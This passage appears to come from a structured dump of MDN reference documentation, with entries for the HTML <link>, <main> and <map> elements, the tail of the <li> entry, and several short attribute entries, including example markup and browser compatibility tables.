[`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`radio`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radio_role), [`separator`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/separator_role), [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`treeitem`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/treeitem_role) |\n| DOM interface                               | [`HTMLLIElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLIElement)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `li`    | 1       | 12   | 1       | ≤12.1 | 3      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `type`  | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `value` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other list-related HTML Elements: [`<ul>`](ul), [`<ol>`](ol), [`<menu>`](menu), and the obsolete [`<dir>`](dir);\n- CSS properties that may be specially useful to style the `<li>` element:\n  - the [`list-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style) property, to choose the way the ordinal is displayed,\n  - [CSS counters](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_counter_styles/Using_CSS_counters), to handle complex nested lists,\n  - the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property, to control the indent of the list item.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/li](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/li)"
- name: link
  summary: The <link> HTML element specifies relationships between the current document and an external resource
  description: "# \\<link\\>: The External Resource Link element\n\nThe `<link>` [HTML](../index) element specifies relationships between the current document and an external resource. This element is most commonly used to link to [stylesheets](https://developer.mozilla.org/en-US/docs/Glossary/CSS), but is also used to establish site icons (both \"favicon\" style icons and icons for the home screen and apps on mobile devices) among other things.\n\n## Try it\n\n#### HTML Demo: \\<link\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <link href=\"/media/examples/link-element-example.css\" rel=\"stylesheet\" />\n\n    <p>This text will be red as defined in the external stylesheet.</p>\n    <p style=\"color: blue\">The <code>style</code> attribute can override it, though.</p>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nTo link an external stylesheet, you'd include a `<link>` element inside your [`<head>`](head) like this:\n\nhtml\n\n```\n<link href=\"main.css\" rel=\"stylesheet\" />\n```\n\nThis simple example provides the path to the stylesheet inside an `href` attribute, and a [`rel`](../attributes/rel) attribute with a value of `stylesheet`. The `rel` stands for \"relationship\", and is one of the key features of the `<link>` element — the value denotes how the item being linked to is related to the containing document.\n\nThere are a number of other common types you'll come across. For example, a link to the site's favicon:\n\nhtml\n\n```\n<link rel=\"icon\" href=\"favicon.ico\" />\n```\n\nThere are a number of other icon `rel` values, mainly used to indicate special icon types for use on various mobile platforms, e.g.:\n\nhtml\n\n```\n<link\n  rel=\"apple-touch-icon\"\n  sizes=\"114x114\"\n  href=\"apple-icon-114.png\"\n  type=\"image/png\" />\n```\n\nThe `sizes` attribute indicates the icon size, while the `type` contains the MIME type of the resource being linked. These provide useful hints to allow the browser to choose the most appropriate icon available.\n\nYou can also provide a media type or query inside a `media` attribute; this resource will then only be loaded if the media condition is true. For example:\n\nhtml\n\n```\n<link href=\"print.css\" rel=\"stylesheet\" media=\"print\" />\n<link\n  href=\"mobile.css\"\n  rel=\"stylesheet\"\n  media=\"screen and (max-width: 600px)\" />\n```\n\nSome interesting new performance and security features have been added to the `<link>` element too. Take this example:\n\nhtml\n\n```\n<link\n  rel=\"preload\"\n  href=\"myFont.woff2\"\n  as=\"font\"\n  type=\"font/woff2\"\n  crossorigin=\"anonymous\" />\n```\n\nA `rel` value of `preload` indicates that the browser should preload this resource (see [`rel=\"preload\"`](../attributes/rel/preload) for more details), with the `as` attribute indicating the specific class of content being fetched. The `crossorigin` attribute indicates whether the resource should be fetched with a [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) request.\n\nOther usage notes:\n\n- A `<link>` element can occur either in the [`<head>`](head) or [`<body>`](body) element, depending on whether it has a [link type](https://html.spec.whatwg.org/multipage/links.html#body-ok) that is **body-ok**. For example, the `stylesheet` link type is body-ok, and therefore `<link rel=\"stylesheet\">` is permitted in the body. However, this isn't a good practice to follow; it makes more sense to separate your `<link>` elements from your body content, putting them in the `<head>`.\n- When using `<link>` to establish a favicon for a site, and your site uses a Content Security Policy (CSP) to enhance its security, the policy applies to the favicon. If you encounter problems with the favicon not loading, verify that the [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) header's [`img-src` directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src) is not preventing access to it.\n- The HTML and XHTML specifications define event handlers for the `<link>` element, but it is unclear how they would be used.\n- Under XHTML 1.0, [void elements](https://developer.mozilla.org/en-US/docs/Glossary/Void_element) such as `<link>` require a trailing slash: `<link />`.\n- WebTV supports the use of the value `next` for `rel` to preload the next page in a document series.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`as`](#as)  \nThis attribute is required when [`rel=\"preload\"`](../attributes/rel/preload) has been set on the `<link>` element, optional when [`rel=\"modulepreload\"`](../attributes/rel/modulepreload) has been set, and otherwise should not be used. It specifies the type of content being loaded by the `<link>`, which is necessary for request matching, application of correct [content security policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), and setting of correct [`Accept`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept) request header.\n\nFurthermore, `rel=\"preload\"` uses this as a signal for request prioritization. The table below lists the valid values for this attribute and the elements or resources they apply to.\n\n[TABLE]\n\n[`blocking`](#blocking) Experimental  \nThis attribute explicitly indicates that certain operations should be blocked on the fetching of an external resource. It must only be used when the `rel` attribute contains `expect` or `stylesheet` keywords. The operations that are to be blocked must be a space-separated list of blocking tokens listed below.\n\n- `render`: The rendering of content on the screen is blocked.\n\n[`crossorigin`](../attributes/crossorigin)  \nThis [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute indicates whether [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) must be used when fetching the resource. [CORS-enabled images](../cors_enabled_image) can be reused in the [`<canvas>`](canvas) element without being *tainted*. The allowed values are:\n\n[`anonymous`](#anonymous)  \nA cross-origin request (i.e. with an [`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) HTTP header) is performed, but no credential is sent (i.e. no cookie, X.509 certificate, or HTTP Basic authentication). If the server does not give credentials to the origin site (by not setting the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) HTTP header) the resource will be tainted and its usage restricted.\n\n[`use-credentials`](#use-credentials)  \nA cross-origin request (i.e. with an `Origin` HTTP header) is performed along with a credential sent (i.e. a cookie, certificate, and/or HTTP Basic authentication is performed). If the server does not give credentials to the origin site (through [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials) HTTP header), the resource will be *tainted* and its usage restricted.\n\nIf the attribute is not present, the resource is fetched without a [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) request (i.e. without sending the `Origin` HTTP header), preventing its non-tainted usage. If invalid, it is handled as if the enumerated keyword **anonymous** was used. See [CORS settings attributes](../attributes/crossorigin) for additional information.\n\n[`disabled`](#disabled)  \nFor `rel=\"stylesheet\"` only, the `disabled` Boolean attribute indicates whether the described stylesheet should be loaded and applied to the document. If `disabled` is specified in the HTML when it is loaded, the stylesheet will not be loaded during page load. Instead, the stylesheet will be loaded on-demand, if and when the `disabled` attribute is changed to `false` or removed.\n\nSetting the `disabled` property in the DOM causes the stylesheet to be removed from the document's [`Document.styleSheets`](https://developer.mozilla.org/en-US/docs/Web/API/Document/styleSheets) list.\n\n[`fetchpriority`](#fetchpriority)  \nProvides a hint of the relative priority to use when fetching a preloaded resource. Allowed values:\n\n[`high`](#high)  \nSignals a high-priority fetch relative to other resources of the same type.\n\n[`low`](#low)  \nSignals a low-priority fetch relative to other resources of the same type.\n\n[`auto`](#auto)  \nDefault: Signals automatic determination of fetch priority relative to other resources of the same type.\n\n[`href`](#href)  \nThis attribute specifies the [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL) of the linked resource. A URL can be absolute or relative.\n\n[`hreflang`](#hreflang)  \nThis attribute indicates the language of the linked resource. It is purely advisory. Allowed values are specified by [RFC 5646: Tags for Identifying Languages (also known as BCP 47)](https://datatracker.ietf.org/doc/html/rfc5646). Use this attribute only if the [`href`](a#href) attribute is present.\n\n[`imagesizes`](#imagesizes)  \nFor `rel=\"preload\"` and `as=\"image\"` only, the `imagesizes` attribute is [a sizes attribute](https://html.spec.whatwg.org/multipage/images.html#sizes-attribute) that indicates to preload the appropriate resource used by an `img` element with corresponding values for its `srcset` and `sizes` attributes.\n\n[`imagesrcset`](#imagesrcset)  \nFor `rel=\"preload\"` and `as=\"image\"` only, the `imagesrcset` attribute is [a sourceset attribute](https://html.spec.whatwg.org/multipage/images.html#srcset-attribute) that indicates to preload the appropriate resource used by an `img` element with corresponding values for its `srcset` and `sizes` attributes.\n\n[`integrity`](#integrity)  \nContains inline metadata — a base64-encoded cryptographic hash of the resource (file) you're telling the browser to fetch. The browser can use this to verify that the fetched resource has been delivered without unexpected manipulation. The attribute must only be specified when the `rel` attribute is specified to `stylesheet`, `preload`, or `modulepreload`. See [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).\n\n[`media`](#media)  \nThis attribute specifies the media that the linked resource applies to. Its value must be a media type / [media query](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries). This attribute is mainly useful when linking to external stylesheets — it allows the user agent to pick the best adapted one for the device it runs on.\n\n[`referrerpolicy`](#referrerpolicy)  \nA string indicating which referrer to use when fetching the resource:\n\n- `no-referrer` means that the [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n- `no-referrer-when-downgrade` means that no [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will be sent when navigating to an origin without TLS (HTTPS). This is a user agent's default behavior, if no policy is otherwise specified.\n- `origin` means that the referrer will be the origin of the page, which is roughly the scheme, the host, and the port.\n- `origin-when-cross-origin` means that navigating to other origins will be limited to the scheme, the host, and the port, while navigating on the same origin will include the referrer's path.\n- `unsafe-url` means that the referrer will include the origin and the path (but not the fragment, password, or username). This case is unsafe because it can leak origins and paths from TLS-protected resources to insecure origins.\n\n[`rel`](../attributes/rel)  \nThis attribute names a relationship of the linked document to the current document. The attribute must be a space-separated list of [link type values](../attributes/rel).\n\n[`sizes`](#sizes)  \nThis attribute defines the sizes of the icons for visual media contained in the resource. It must be present only if the [`rel`](#rel) contains a value of `icon` or a non-standard type such as Apple's `apple-touch-icon`. It may have the following values:\n\n- `any`, meaning that the icon can be scaled to any size as it is in a vector format, like `image/svg+xml`.\n- a white-space separated list of sizes, each in the format `<width in pixels>x<height in pixels>` or `<width in pixels>X<height in pixels>`. Each of these sizes must be contained in the resource.\n\n**Note:** Most icon formats are only able to store one single icon; therefore, most of the time, the [`sizes`](#sizes) attribute contains only one entry. Microsoft's ICO format and Apple's ICNS format can store multiple icon sizes in a single file. ICO has better browser support, so you should use this format if cross-browser support is a concern.\n\n[`title`](#title)  \nThe `title` attribute has special semantics on the `<link>` element. When used on a `<link rel=\"stylesheet\">` it defines a [default or an alternate stylesheet](https://developer.mozilla.org/en-US/docs/Web/CSS/Alternative_style_sheets).\n\n[`type`](#type)  \nThis attribute is used to define the type of the content linked to. The value of the attribute should be a MIME type such as **text/html**, **text/css**, and so on. The common use of this attribute is to define the type of stylesheet being referenced (such as **text/css**), but given that CSS is the only stylesheet language used on the web, not only is it possible to omit the `type` attribute, but is actually now recommended practice. It is also used on `rel=\"preload\"` link types, to make sure the browser only downloads file types that it supports.\n\n### Non-standard attributes\n\n[`target`](#target) Deprecated  \nDefines the frame or window name that has the defined linking relationship or that will show the rendering of any linked resource.\n\n### Obsolete attributes\n\n[`charset`](#charset) Deprecated  \nThis attribute defines the character encoding of the linked resource. The value is a space- and/or comma-delimited list of character sets as defined in [RFC 2045](https://datatracker.ietf.org/doc/html/rfc2045). The default value is `iso-8859-1`.\n\n**Note:** To produce the same effect as this obsolete attribute, use the [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) HTTP header on the linked resource.\n\n[`rev`](#rev) Deprecated  \nThe value of this attribute shows the relationship of the current document to the linked document, as defined by the [`href`](#href) attribute. The attribute thus defines the reverse relationship compared to the value of the `rel` attribute. [Link type values](../attributes/rel) for the attribute are similar to the possible values for [`rel`](#rel).\n\n**Note:** Instead of `rev`, you should use the [`rel`](#rel) attribute with the opposite [link type value](../attributes/rel). For example, to establish the reverse link for `made`, specify `author`. Also, this attribute doesn't stand for \"revision\" and must not be used with a version number, even though many sites misuse it in this way.\n\n## Examples\n\n### Including a stylesheet\n\nTo include a stylesheet in a page, use the following syntax:\n\nhtml\n\n```\n<link href=\"style.css\" rel=\"stylesheet\" />\n```\n\n### Providing alternative stylesheets\n\nYou can also specify [alternative style sheets](https://developer.mozilla.org/en-US/docs/Web/CSS/Alternative_style_sheets).\n\nThe user can choose which style sheet to use by choosing it from the **View \\> Page Style** menu. This provides a way for users to see multiple versions of a page.\n\nhtml\n\n```\n<link href=\"default.css\" rel=\"stylesheet\" title=\"Default Style\" />\n<link href=\"fancy.css\" rel=\"alternate stylesheet\" title=\"Fancy\" />\n<link href=\"basic.css\" rel=\"alternate stylesheet\" title=\"Basic\" />\n```\n\n### Providing icons for different usage contexts\n\nYou can include links to several icons on the same page, and the browser will choose which one works best for its particular context using the `rel` and `sizes` values as hints.\n\nhtml\n\n```\n<!-- iPad Pro with high-resolution Retina display: -->\n<link\n  rel=\"apple-touch-icon\"\n  sizes=\"167x167\"\n  href=\"/apple-touch-icon-167x167.png\" />\n<!-- 3x resolution iPhone: -->\n<link\n  rel=\"apple-touch-icon\"\n  sizes=\"180x180\"\n  href=\"/apple-touch-icon-180x180.png\" />\n<!-- non-Retina iPad, iPad mini, etc.: -->\n<link\n  rel=\"apple-touch-icon\"\n  sizes=\"152x152\"\n  href=\"/apple-touch-icon-152x152.png\" />\n<!-- 2x resolution iPhone and other devices: -->\n<link rel=\"apple-touch-icon\" href=\"/apple-touch-icon-120x120.png\" />\n<!-- basic favicon -->\n<link rel=\"icon\" href=\"/favicon.ico\" />\n```\n\nFor information about what `sizes` to choose for Apple icons, see [Apple's documentation on configuring web applications](https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html#//apple_ref/doc/uid/TP40002051-CH3-SW4) and the referenced [Apple human interface guidelines](https://developer.apple.com/design/human-interface-guidelines/app-icons#App-icon-sizes). Usually, it is sufficient to provide a large image, such as 192x192, and let the browser scale it down as needed, but you may want to provide images with different levels of detail for different sizes, as the Apple design guideline recommends. Providing smaller icons for lower resolutions also saves bandwidth.\n\nIt may not be necessary to provide `<link>` elements at all. For example, browsers automatically request `/favicon.ico` from the root of a site, and Apple also automatically requests `/apple-touch-icon-[size].png`, `/apple-touch-icon.png`, etc. However, providing explicit links protects you against changes to these conventions.\n\n### Conditionally loading resources with media queries\n\nYou can provide a media type or query inside a `media` attribute; this resource will then only be loaded if the media condition is true. For example:\n\nhtml\n\n```\n<link href=\"print.css\" rel=\"stylesheet\" media=\"print\" />\n<link href=\"mobile.css\" rel=\"stylesheet\" media=\"all\" />\n<link\n  href=\"desktop.css\"\n  rel=\"stylesheet\"\n  media=\"screen and (min-width: 600px)\" />\n<link\n  href=\"highres.css\"\n  rel=\"stylesheet\"\n  media=\"screen and (min-resolution: 300dpi)\" />\n```\n\n### Stylesheet load events\n\nYou can determine when a style sheet has been loaded by watching for a `load` event to fire on it; similarly, you can detect if an error has occurred while processing a style sheet by watching for an `error` event:\n\nhtml\n\n```\n<link rel=\"stylesheet\" href=\"mystylesheet.css\" id=\"my-stylesheet\" />\n\n<script>\n  const stylesheet = document.getElementById(\"my-stylesheet\");\n\n  stylesheet.onload = () => {\n    // Do something interesting; the sheet has been loaded\n  };\n\n  stylesheet.onerror = () => {\n    console.log(\"An error occurred loading the stylesheet!\");\n  };\n</script>\n```\n\n**Note:** The `load` event fires once the stylesheet and all of its imported content has been loaded and parsed, and immediately before the styles start being applied to the content.\n\n### Preload examples\n\nYou can find a number of `<link rel=\"preload\">` examples in [Preloading content with `rel=\"preload\"`](../attributes/rel/preload).\n\n### Blocking rendering till a resource is fetched\n\nYou can include `render` token inside a `blocking` attribute; the rendering of the page will be blocked till the resource is fetched. For example:\n\nhtml\n\n```\n<link blocking=\"render\" rel=\"stylesheet\" href=\"example.css\" crossorigin />\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | Metadata content. If [`itemprop`](../global_attributes/itemprop) is present: [Flow content](../content_categories#flow_content) and [phrasing content](../content_categories#phrasing_content). |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                                   |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                                                                                                             |\n| Permitted parents                           | Any element that accepts metadata elements. If [itemprop](../global_attributes/itemprop) is present: any element that accepts [phrasing content](../content_categories#phrasing_content).       |\n| Implicit ARIA role                          | [`link`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/link_role) with `href` attribute                                                                                 |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                             |\n| DOM interface                               | [`HTMLLinkElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement)                                                                                                           |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`Link`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Link) HTTP header\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link)"
- name: list (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`list`](element/input#list)

    [`<input>`](element/input)

    Identifies a list of pre-defined options to suggest to the user.
- name: loading (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    `loading`

    [`<img>`](element/img), [`<iframe>`](element/iframe)

    Indicates if the element should be loaded lazily (`loading="lazy"`) or loaded immediately (`loading="eager"`).
- name: loop (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`loop`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/loop)

    [`<audio>`](element/audio), [`<marquee>`](element/marquee), [`<video>`](element/video)

    Indicates whether the media should start playing from the start when it's finished.
- name: low (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`low`](element/meter#low)

    [`<meter>`](element/meter)

    Indicates the upper bound of the lower range.
- name: main
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<main\\>: The Main element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fmain&level=high)\n\nThe `<main>` [HTML](../index) element represents the dominant content of the [`<body>`](body) of a document. The main content area consists of content that is directly related to or expands upon the central topic of a document, or the central functionality of an application.\n\n## Try it\n\n#### HTML Demo: \\<main\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <header>Gecko facts</header>\n\n    <main>\n      <p>\n        Geckos are a group of usually small, usually nocturnal lizards. They are found on every continent except Antarctica.\n      </p>\n\n      <p>Many species of gecko have adhesive toe pads which enable them to climb walls and even windows.</p>\n    </main>\n\n    header {\n      font:\n        bold 7vw Arial,\n        sans-serif;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nA document mustn't have more than one `<main>` element that doesn't have the [`hidden`](../global_attributes#hidden) attribute specified.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe content of a `<main>` element should be unique to the document. Content that is repeated across a set of documents or document sections such as sidebars, navigation links, copyright information, site logos, and search forms shouldn't be included unless the search form is the main function of the page.\n\n`<main>` doesn't contribute to the document's outline; that is, unlike elements such as [`<body>`](body), headings such as [h2](heading_elements), and such, `<main>` doesn't affect the [DOM's](https://developer.mozilla.org/en-US/docs/Glossary/DOM) concept of the structure of the page. It's strictly informative.\n\n## Accessibility\n\n### Landmark\n\nThe `<main>` element behaves like a [`main` landmark](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role) role. [Landmarks](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Techniques#landmark_roles) can be used by assistive technology to quickly identify and navigate to large sections of the document. Prefer using the `<main>` element over declaring `role=\"main\"`, unless there are [legacy browser support concerns](#browser_compatibility).\n\n### Skip navigation\n\nSkip navigation, also known as \"skipnav\", is a technique that allows an assistive technology user to quickly bypass large sections of repeated content (main navigation, info banners, etc.). This lets the user access the main content of the page faster.\n\nAdding an [`id`](../global_attributes#id) attribute to the `<main>` element lets it be a target of a skip navigation link.\n\nhtml\n\n```\n<body>\n  <a href=\"#main-content\">Skip to main content</a>\n\n  <!-- navigation and header content -->\n\n  <main id=\"main-content\">\n    <!-- main page content -->\n  </main>\n</body>\n```\n\n- [WebAIM: \"Skip Navigation\" Links](https://webaim.org/techniques/skipnav/)\n\n### Reader mode\n\nBrowser reader mode functionality looks for the presence of the `<main>` element, as well as [heading](heading_elements) and [content sectioning elements](../element#content_sectioning) when converting content into a specialized reader view.\n\n- [Building websites for Safari Reader Mode and other reading apps.](https://medium.com/@mandy.michael/building-websites-for-safari-reader-mode-and-other-reading-apps-1562913c86c9)\n\n## Examples\n\nhtml\n\n```\n<!-- other content -->\n\n<main>\n  <h1>Apples</h1>\n  <p>The apple is the pomaceous fruit of the apple tree.</p>\n\n  <article>\n    <h2>Red Delicious</h2>\n    <p>\n      These bright red apples are the most common found in many supermarkets.\n    </p>\n    <p>…</p>\n    <p>…</p>\n  </article>\n\n  <article>\n    <h2>Granny Smith</h2>\n    <p>These juicy, green apples make a great filling for apple pies.</p>\n    <p>…</p>\n    <p>…</p>\n  </article>\n</main>\n\n<!-- other content -->\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                      |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), palpable content.                                                                                                                                                                |\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                                                                                                                  |\n| Tag omission                                | None; both the starting and ending tags are mandatory.                                                                                                                                                                               |\n| Permitted parents                           | Where [flow content](../content_categories#flow_content) is expected, but only if it is a [hierarchically correct `main` element](https://html.spec.whatwg.org/multipage/grouping-content.html#hierarchically-correct-main-element). |\n| Implicit ARIA role                          | [`main`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role)                                                                                                                                            |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                  |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `main` | 26      | 12   | 21      | 16    | 7      | 26             | 21                  | 14            | 7             | 1.5              | 4.4             |     |\n\n## See also\n\n- Basic structural elements: [`<html>`](html), [`<head>`](head), [`<body>`](body)\n- Section-related elements: [`<article>`](article), [`<aside>`](aside), [`<footer>`](footer), [`<header>`](header), or [`<nav>`](nav)\n- [ARIA: Main role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/main](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/main)"
- name: map
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<map\\>: The Image Map element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fmap&level=high)\n\nThe `<map>` [HTML](../index) element is used with [`<area>`](area) elements to define an image map (a clickable link area).\n\n## Try it\n\n#### HTML Demo: \\<map\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <map name=\"infographic\">\n      <area\n        shape=\"poly\"\n        coords=\"130,147,200,107,254,219,130,228\"\n        href=\"https://developer.mozilla.org/docs/Web/HTML\"\n        target=\"_blank\"\n        alt=\"HTML\" />\n      <area\n        shape=\"poly\"\n        coords=\"130,147,130,228,6,219,59,107\"\n        href=\"https://developer.mozilla.org/docs/Web/CSS\"\n        target=\"_blank\"\n        alt=\"CSS\" />\n      <area\n        shape=\"poly\"\n        coords=\"130,147,200,107,130,4,59,107\"\n        href=\"https://developer.mozilla.org/docs/Web/JavaScript\"\n        target=\"_blank\"\n        alt=\"JavaScript\" />\n    </map>\n    <img usemap=\"#infographic\" src=\"/media/examples/mdn-info2.png\" alt=\"MDN infographic\" />\n\n    img {\n      display: block;\n      margin: 0 auto;\n      width: 260px;\n      height: 232px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`name`](#name)  \nThe `name` attribute gives the map a name so that it can be referenced. The attribute must be present and must have a non-empty value with no space characters. The value of the `name` attribute must not be equal to the value of the `name` attribute of another `<map>` element in the same document. If the [`id`](../global_attributes#id) attribute is also specified, both attributes must have the same value.\n\n## Examples\n\n### Image map with two areas\n\nClick the left-hand parrot for JavaScript, or the right-hand parrot for CSS.\n\n#### HTML\n\nhtml\n\n```\n<!-- Photo by Juliana e Mariana Amorim on Unsplash -->\n<map name=\"primary\">\n  <area\n    shape=\"circle\"\n    coords=\"75,75,75\"\n    href=\"https://developer.mozilla.org/docs/Web/JavaScript\"\n    target=\"_blank\"\n    alt=\"JavaScript\" />\n  <area\n    shape=\"circle\"\n    coords=\"275,75,75\"\n    href=\"https://developer.mozilla.org/docs/Web/CSS\"\n    target=\"_blank\"\n    alt=\"CSS\" />\n</map>\n<img\n  usemap=\"#primary\"\n  src=\"parrots.jpg\"\n  alt=\"350 x 150 picture of two parrots\" />\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | Any [transparent](../content_categories#transparent_content_model) element.                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                               |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                               |\n| DOM interface                               | [`HTMLMapElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMapElement)                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<a>`](a)\n- [`<area>`](area)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  